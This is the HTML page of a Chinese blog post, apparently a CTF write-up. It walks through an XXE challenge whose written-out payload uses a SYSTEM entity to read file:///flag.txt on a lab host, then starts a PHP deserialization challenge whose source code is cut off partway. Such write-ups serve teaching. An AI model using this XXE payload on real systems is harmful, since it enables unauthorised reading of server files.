

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=dark>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="0ldcat">
  <meta name="keywords" content="">
  
    <meta name="description" content="神州数码DCFW-1800CTF题目，两年前打的，整理笔记传入博客备份管理 WEB1、web_xxe来自 http:&#x2F;&#x2F;192.168.1.200&#x2F;race.php&#x2F;soldier&#x2F;checkpoint?level_id&#x3D;755&amp;id&#x3D;137&amp;scenes_id&#x3D;52&amp;key&#x3D;0  这道题目个人感觉有点离谱，因为传入的xxepayload完全是混乱的，后续我是通过后端代码和">
<meta property="og:type" content="article">
<meta property="og:title" content="神州数码DCFW-1800CTF题目wp">
<meta property="og:url" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/index.html">
<meta property="og:site_name" content="0ldcat_blog">
<meta property="og:description" content="神州数码DCFW-1800CTF题目，两年前打的，整理笔记传入博客备份管理 WEB1、web_xxe来自 http:&#x2F;&#x2F;192.168.1.200&#x2F;race.php&#x2F;soldier&#x2F;checkpoint?level_id&#x3D;755&amp;id&#x3D;137&amp;scenes_id&#x3D;52&amp;key&#x3D;0  这道题目个人感觉有点离谱，因为传入的xxepayload完全是混乱的，后续我是通过后端代码和">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210734054.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210751666.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210808927.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210825367.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210849373.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211547997.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211838818.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211849645.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211901120.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211917464.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211929563.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024211955794.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212006538.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212056153.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212139000.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212210101.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212352536.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212359310.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212459640.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212536891.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212543302.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212550522.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212604245.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212839607.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212906846.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213101422.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213110669.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213120035.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213205514.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213517791.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213528923.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213539655.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213545465.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213617430.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213624307.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213631759.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213640810.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213831343.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213840875.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213848988.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213859301.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213918313.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213922112.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213927179.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213933192.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213943424.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214030014.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214036645.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214050275.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214104407.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214115629.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214127139.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214236552.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214255481.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214301028.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214310266.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214335166.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214350042.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214423013.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214429880.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214437978.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214446037.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214522971.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214529391.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214551289.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214600445.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214621259.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214632124.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214703545.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214718998.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214726641.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214850175.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214901291.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214925010.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214931121.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214941515.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215354621.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215435738.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215445919.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215512802.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215540379.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215547119.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215603216.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215613767.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215623359.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215645366.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215658740.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215704216.png">
<meta property="og:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215711520.png">
<meta property="article:published_time" content="2024-10-24T13:03:22.000Z">
<meta property="article:modified_time" content="2024-10-24T13:58:03.990Z">
<meta property="article:author" content="0ldcat">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210734054.png">
  
  
  <title>神州数码DCFW-1800CTF题目wp - 0ldcat_blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"😒","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>闲言碎语</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="神州数码DCFW-1800CTF题目wp">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2024-10-24 21:03" pubdate>
        2024年10月24日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      17k 个字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      145 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">神州数码DCFW-1800CTF题目wp</h1>
            
            <div class="markdown-body">
              <p>神州数码DCFW-1800CTF题目，两年前打的，整理笔记传入博客备份管理</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1、web-xxe"><a href="#1、web-xxe" class="headerlink" title="1、web_xxe"></a>1、web_xxe</h2><p>来自 <a target="_blank" rel="noopener" href="http://192.168.1.200/race.php/soldier/checkpoint?level_id=755&amp;id=137&amp;scenes_id=52&amp;key=0">http://192.168.1.200/race.php/soldier/checkpoint?level_id=755&amp;id=137&amp;scenes_id=52&amp;key=0</a> </p>
<p>这道题目个人感觉有点离谱，因为传入的xxepayload完全是混乱的，后续我是通过后端代码和payload传进去调整的。。</p>
<p>一．通过抓包分析有ｃｏｏｋｉｅ经行bash64解码发现是  </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210734054.png" srcset="/img/loading.gif" lazyload alt="image-20241024210734054"></p>
<p>存在<em>xxe</em>头  </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210751666.png" srcset="/img/loading.gif" lazyload alt="image-20241024210751666"></p>
<p>所以把<em>xxe</em>攻击代码构造好再base64编码后发用BP改ｃｏｏｋｉｅ发送 <em>Xxe</em>代码为]&gt;  </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210808927.png" srcset="/img/loading.gif" lazyload alt="image-20241024210808927"></p>
<p>成功读取到文件。 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210825367.png" srcset="/img/loading.gif" lazyload alt="image-20241024210825367"></p>
<p>修改<em>xxe</em>代码读取flag.txt文件</p>
<p>payload:</p>
<p><code>&lt;?xml version=＂1.0＂ encoding=＂UTF-8＂?&gt;&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM ＂[file:///flag.txt](file:///flag.txt)＂ &gt;]&gt;</code></p>
<p>参数email&#x3D;123q％26<em>xxe</em>;q.com  </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024210849373.png" srcset="/img/loading.gif" lazyload alt="image-20241024210849373"></p>
<h2 id="2、-WEB-simple-ser"><a href="#2、-WEB-simple-ser" class="headerlink" title="2、!WEB_simple_ser"></a>2、!WEB_simple_ser</h2><p>题目代码：</p>
<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls1</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$arr</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;arr <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;cls-&gt;<span class="hljs-variable">$v</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span 